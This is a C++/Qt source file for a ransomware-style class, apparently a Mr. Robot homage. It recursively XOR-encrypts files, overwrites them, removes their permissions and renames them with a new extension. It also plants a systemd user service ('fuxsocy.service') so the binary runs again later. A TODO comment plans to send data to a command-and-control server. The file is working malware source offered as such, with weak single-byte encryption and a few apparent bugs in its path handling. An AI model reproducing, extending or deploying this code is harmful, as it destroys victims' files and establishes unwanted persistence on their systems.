#include "fsociety.h"

#include <algorithm>
#include <QDirIterator>
#include <QDir>
#include <QStringList>

void Fsociety::processFile(const QString& filepath, bool encrypt = true) const {
	QFile file(filepath);

	// encrypt the file
	if (!file.open(QIODevice::ReadWrite))
		return;
	QByteArray arr = file.readAll(); // FIXME if file is large this could be a problem
	for (char& b : arr)
		b = (b ^ this->key);

#if !SAFE_MODE
	file.seek(0); // start writing at position 0
	file.write(arr); // TODO send data to C&C server, encrypt files with more powerful technique
	file.setPermissions({}); // remove all permissions from file
#endif
	file.close();

	// rename the file
	QString newFileName = file.fileName();
//	int dotIdx = newFileName.lastIndexOf('.');
//	if (dotIdx > 0)
//		newFileName = newFileName.remove(dotIdx, newFileName.length() - dotIdx);
	if (encrypt)
		newFileName.append(this->extension);
	else if (newFileName.endsWith(this->extension))
		newFileName.remove(newFileName.lastIndexOf(this->extension), this->extension.length());
	file.rename(newFileName);
}

bool Fsociety::shouldExclude(const QString& filepath) {
	auto fun = [filepath](const QString& exclusion) {
		return filepath.endsWith(exclusion);
	};
	return std::any_of(this->extensionExclusions.begin(), this->extensionExclusions.end(), fun);
}

size_t Fsociety::encryptFiles(const QString& dir) {
	size_t total_encrypted = 0;
	QDirIterator dirIterator(
		dir,
		QDir::Files | QDir::Readable | QDir::Writable,
		QDirIterator::Subdirectories
	);

	while (dirIterator.hasNext()) {
		dirIterator.next();
		if (this->shouldExclude(dirIterator.filePath()))
			continue;

		this->processFile(dirIterator.filePath());
		++total_encrypted;
	}

	return total_encrypted;
}

size_t Fsociety::decryptFiles(const QString& dir) {
	size_t total_decrypted = 0;
	QDirIterator dirIterator(
		dir,
		{"*" + this->extension},
		QDir::Files | QDir::Readable | QDir::Writable,
		QDirIterator::Subdirectories
	);

	while (dirIterator.hasNext()) {
		dirIterator.next();
		// because encryption is performed with a single xor operation,
		// decryption is as simple as apply the operation again with the same key obviously
		this->processFile(dirIterator.filePath(), false);
		++total_decrypted;
	}

	return total_decrypted;
}

void Fsociety::setExtExclusions(const QStringList& newExtExclusions) {
	this->extensionExclusions = newExtExclusions; // copy assignment
	this->extensionExclusions.append(extension);
}

void Fsociety::setBinName(const QString &name) {
	this->binName = name;
}

void Fsociety::install() {
#if _GNU_SOURCE
	QString userConfig = qEnvironmentVariable("$XDG_CONFIG_HOME", qEnvironmentVariable("$HOME", "/") + "/.userConfig");
	QString installationPath = QDir(userConfig).filePath("systemd/user");
	QDir installationDir(installationPath);
	if (!installationDir.exists()) {
		installationDir.mkpath(".");
	}
	QString serviceUnitPath = installationDir.filePath("fuxsocy.service");
	QString binaryPath = installationDir.filePath("fuxsocy.py");

	// write the service unit file
	QString service = R"(
[Unit]
Description=Fuck society
Requires=graphical.target

[Service]
Type=simple
ExecStart=)";
	service += binaryPath + "\n";

	QFile serviceFile(serviceUnitPath);
	if (serviceFile.exists())
		return; // probably it is already installed
	if (serviceFile.open(QIODevice::WriteOnly | QIODevice::Text/* | QIODevice::NewOnly*/)) {
		serviceFile.write(service.toStdString().c_str());
		serviceFile.close();
	}

	// copy the executable
	QFile::copy(this->binName, binaryPath); // yes it's not a python file, it's just a wink to Mr. Robot
#endif
}